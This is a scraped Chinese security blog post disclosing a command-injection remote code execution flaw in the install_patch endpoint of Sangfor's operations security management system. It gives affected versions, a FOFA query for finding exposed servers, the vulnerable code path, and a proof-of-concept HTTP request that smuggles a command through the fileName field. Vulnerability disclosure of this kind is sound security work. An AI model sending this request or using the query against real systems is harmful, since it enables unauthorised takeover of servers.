---
title: "深信服运维安全管理系统 install_patch 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html
asset_dir: assets/深信服运维安全管理系统-install_patch-远程命令执行漏洞
---

# 深信服运维安全管理系统 install\_patch 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/3/11 08:41
* 97浏览
* [0评论](#comment)
* 6分钟阅读

深入探索

安全

漏洞扫描器

JSON处理工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深信服运维安全管理系统 install\_patch 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

Windows安全工具

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.web.controller.system.concentrationManagement.NodePatchController#delPatch`的实现逻辑

[![深信服运维安全管理系统 install_patch 远程命令执行漏洞](images/img-001-93daa1b18215.webp)](https://image.mrxn.net/b99833148d1944c2b9d4c23b1af6a9ff.webp)

参数 `fileName` 直接拼接进 **cmd** 中进行[命令执行](https://mrxn.net/tag/rce),从而造成[命令注入](https://mrxn.net/tag/rce)漏洞。

深入探索

服务器安全服务

Docker加速服务

VPN服务

# 漏洞复现

[![深信服运维安全管理系统 install_patch 远程命令执行漏洞](images/img-002-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

深入探索

在线安全工具

安全研究报告

身份验证

```
POST /fort/system;help/concentration_management/install_patch HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

fileName=123;RCE_POC
```

[![深信服运维安全管理系统 install_patch 远程命令执行漏洞](images/img-003-78cfdf09a6c6.webp)](https://image.mrxn.net/df4a1a5e878a4adc876148925fe9c72c.webp)

访问命令执行结果重定向文件，成功获取到[命令执行](https://mrxn.net/tag/rce)结果。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)  
文章链接：<https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAANK0lEQVR4Aeyb0XbcSA5Dc+f//3nXEH27WeyS7HgysR+0xwhIEKSUopS2vWf++fXr1/9+F/9r/7O3SUeo/hk+GjZ/2GvpKrcmzx512bocvcc9n3pqHdY79/rvxFnIr7dBn8Lb4A+/gF/Aw+dsBXNZPQwcvVAcLYDrPJ7dvJ2uD9aZ0eMPEgeJO6J1WIN1lnq4+6/ieINjIQlu/IwTWBYCtWlY+TO3CtXjUzB7pg7ln77k02suxxPMPJqAdb5eKH3mgK0PBrZvrAZnmF8xrLOg8tmzLGQW7/zvn8AfW4hPC+w3f/ZXS5+1xIG5DDUTiuMJet1YTj0wl6MFULO6DqvWa+kxh/JBcWoBoOXL/McW8uU7uBuXE/hXCwEe350tU9+SPDEBcPnvMDzrb22XX5kXwLMHOHqA4zpH8vYHrPmbtHxlTkeK5rD2QuVQrC89HdF7/pX4Xy3kKxe8e65PYFlINrzD2Yh4oZ4aPdGCs3zq3Qs1C4pT64DSdzP0WZOhemDP+v5r9v4mz+suC5nFL+d345dP4FgI7J8eWPV5FXh+hkB59cCaq8vwWvfp0SNDea/qeuXpPcuhZqcPKj7zxnMF4KUMHJ9tcM02Hgsxufn7T+Afn4bf4X7bUJvvWo9hX/d68RrD6oXrPL1B+sMdUL2pBbDPe48xrF51GdY6PHM9ueZXcL8hnuAP4WUhUJuG4nmPUDoUpz6fgmg76INnrz5YNb3WzWV1qD54srWP2FkyPD8P1ZwBNd/cOpQ+cygdsOXxOfIQToJjIcDRoMcLmEPV1eXUoWqwcmpB9/Ycyt+1xFeA6jmbGf2qPzWoGVAcLUgvlAbF0YPUgsQBrPVoQTwTsPdC6bDysZAMu/EzTuAfeL6qZ7fk1mHdZvfrka1B9cxcH2DpP2WvNy8CHP86AI/S9AKHR4N1GZ51qBiKZw+s+qzfb4gn8kN4WYgbn/cGtdVZNw/PnmgdsM6AZz574VnLDDjyxy8yoXL7AMOHRwE4nm4ozrwzzB7zyVCzoHjWk89rQHmnHm8AVV8WksKN7z2B4wdDqO14K7DmbhVWXX9nWD2wz53Ze41nzRzWWd1vPNleGdYZUDkwWx9vlgVnmMs7HXj0A1oXDZ66M+435HFUPyM4vsuat+K2gGWj6voBw4dPD3BoD8N7YP09PQjKO2tQ+mF6+8O6/CadfumBmgHF6rvGq1r365OhZnePsR5ZXVaHmnG/IZ7MD+FjIXNLUNua9wil608dXrXoonvVPstnvXB9zcyH8iTeAV7rUNq8rjlU3Xnwmus986hPn/qxEJObv/8EjoVAbdqtyd6euQyvfr1QNfPJ8Fp3rl549aQGpZ/5oepA7FsAx2ebM3ZsozWoHnWo3Lp656ta90HNUjsWYnLz95/A8XOItwG1LSieW4ZVh8rhyc6aveoyVI9559kL5VWHyq96em0XQ83gnbsHqta1xF5fhvKZh+PriBZ07Sq+35Cr0/mG2rGQbHAH7wfWJ0H9qkcPVK+5bK95GFYvXOfpCTILVm+0IPUgcZB4B+AhxxcoJA7MgeVzSD0MVYOVUwsyJ0gcJO44FgL75jR0wMc+h0N5zZ1jDlWPDs94l0cL7JWh+oCUt5he82mODhwHbQ0qh2L1eANzqDq8/l8Z8QXw9AC2vvCxkBf1Fr7tBC4XAixPTDbdkbuG1QNrHs8Ozkmtx7s82kdwhgx1H1B81t/9PYbXpx3WWVC5fbkGrBpUnloH7PXLhfQBd/x3TmD7y0Wo7fXN53ag9MQBEFpgjwwcb9nMl6b3RM97+iB1qFkW1MNqUJ5oO+jbMVSvNVjzqTsfXn2wanqdccb3G3J2Mt+kLz8Ynt2D25X1JTeG9YlQjyc4y6PD2gtrHs9HgOrJtQKo/KM+6+kRah8x1DXsu2Io75wJpUPx/YbME/oz+ZenbD9D5jSo7cEr+1TYA6tn6jOH53czUL3OlGHV54zkv+ONfwfYX2fn3WlQ/fBkfd7fR/n9hnhCP4QvP0OgNu29zi2r7/gjr/Uw1HUSB1D5bm40qHq8wU6D8qQWxBfAqqf2EdK3w+yLZ2rmUNeNJ1BPHEDV7zfEk/kh/KnPEO8VaovmYXjVogtY6/Ca650M5c0TFEDl+qByQOn4mQdeP5cehvcg8wLg0fNeeuSpB+ofMfBiAY55FqByKFbPdYL7DfFEfggvnyHZUDDvLdoO8aknDs5ydRnWJyS9Qo8Me6/1zs6AfY912V7zzlAzYM/2QtXTqzY5tQ7r8OxN/X5Dcgo/CMtCoLbl9uZ9QtWn3nO49kDVd9eAqjkPKtcrW5cBw08zsPzb3hvPrqMuQ80w7zOgal1LvPNGh/IfH+pnphg7dj6oQfqmB6oOxfpk/Z2hvGpQuT2T45vaWR5vYB1qdjRhbTKUd+q7/GwW7GfoX96QOfjO//4JbBcC6xahclg5t+tm5WgBlHfqqXUAPf2tGDj+2YEnzwFeH8pjXd18x9NzlsNzNlQMKzt/zlCH8m8Xounmv38Cx0KgtjMv7zavePaY2wM121yGp24PPLX41BMHV/lZDWqmdVjzrvcYMP005x4nbFYHlrdaXT4WYtPN338C24W4LVi3CZVf3TaUB4r1wpp7jdShampQORTHcwV4/qrkzOds67DOTh1KSxzAPofSodiZn+HM7Zg924VM053/vRM4fnXixrws7Dc/ffo765ncPYmhrgHPpxtKS30HqDoU68m1jGGtqX/EwMMCHP/OZ24AlT8MJwHwqADLDAtQOuz5fkM8qR/Cx0/qUNvynvJU7ACrDyoHbD2eCuDBFpwHVes6lKan16LBWo/WAdjy8t+pPwongXNSNpaj7XBVB46/++yD0q960/MNb0gue+PsBI6FuDV5mmHdLlQe3+wxl6G8UKwuAxlzie6FV3/qDgAun1B9k/uMXe2z9fg6YL0fWHO9XvNYiMnN338Cx0KgtgYrz9uDqk89Oaw1qHw+AVB6en4X/2aWvZP7PcD+3mDVYZ9nNqy1Pj9xPB1QfrVjITHe+Bkn8FsLcYtXtw7rxqHy2QNP3bnw1OKHfQ6l29e9XYtuDtUDxakFsOZnWnRnydECc3j+TBX9M7BX77GQKZpD3exZHh1Wj4OhdPN4O9TDUN5e73E8gVriAKov8cT0msuw9gJzxPHNAZwfsrNeGjfC9ALHfK1Q+bEQxZu//wSOX51AbcctQuXeHlQ+64CWB+t5CO8BcDwRUKwv/G5Z6lA+wPKjnp7gUXgLkgdv4fIFHH2L+JbEe4a38vIFNQOKl+JbAqVn3lu6fEULFOHpjQ6VW7/fEE/ih/DlQrLBDli3+Zmaf8/uTawOGL782iO+ADie8sTBo+E9AH69hy8Uf/BSGMLvzIi3I/ODjOx64mg7pBbM2uVCpvnO//sTOH65mO0G2ViQOEjcEa0jt2dd3Ty1DvXJ8dibOPgojyeYvmhnmNedee9zrqy3exJ/VI/HXjlaYK8cLbjfkJzCD8LxXZb347bcprl19c561GZur/rMo9s7Wa9s3VzODOPJsyfeM9hrj3zmn/Xkzpg8Z5zV7zdknsw358dCstkOt+m9me/YPr1nrM8Z5vGrJQ7Mu6friTviM0/coS5bm3l0Na8vpxZYTxzs6mqTZ6/55GMhU7zz7zuB47ssL+9Ws/3PIH32yPaZx7ODdf1hfYmD6Zl18/iM5WjBzKMFUzfvnHsI4g8SB4kDvYkD8x2nL7CWODCX7zfEk/ghvHyXlY0F2fYVvPd4e5zcvsSBdTlah/6wnsSBPvXJu3r6Ar2JA/NdT2rxWJN//UrliXiCWTfvNbVn9z7SJ99vyP6cvk09FpLNdriteVc7Xc1+e2auLn9Uj0+PHG0H72HH+q2dzUp91sxTC5wlRwt6biynHpg78yw/FmJRnk1T73XjXDTQe8Y7f/qCWYvWMWfq7zw9M+/zejx9u1z/rHn96MaTU+uwPmduF9Ib7/jvnsDxba9b+izvbtGNz9rUvYa+5HoSB+aTUwvslXeavakFemXrneML1PR+hTMn+Gyv17zfkM+e2F/yHQtxOx/xvKf4p2aep6NDXU6vmFrv67G+yZkztZnHE0zdPNcxPuP0B7Oe3qDr8QVd28XxBOkPjoXsjLf2PSewLCQb2uFP3FqegmA3y2tai69DfbJ9nafHOerm9qh3njV79JhPTt3eyal1nNWXhfSGO/7vTuBq8r9aSLbs8MSBuU+PeWqBudy1xIE1ec4yv+LMCZyRuMNe652tdX/i7ulxakHXnNG1xPEFs27+rxaSC9z4syfwxxeS7QfeppuX1eMJkluTowepBYkD69EmUu/Qq6Zf3VxWD88ePfJZPb1ietRlZ8n6//hCvMDNXzuBZSFub/LZ6PjOam7c+szTG6RuTY62g3VZT/LM6rB2xuk5Q5+T2Bn6owXqO069w1559uhdFjJNd/73T+BYiFv7iK9uzw3rMXemuazvis96ndHrxpP1eh3rU09dTY+cWmA9cYd6/OqJO/TI+iYfC5ninX/fCfwfAAD//7q0/V0AAAAGSURBVAMAndMYy/gqWh8AAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-system-concentration\_management-install\_patch-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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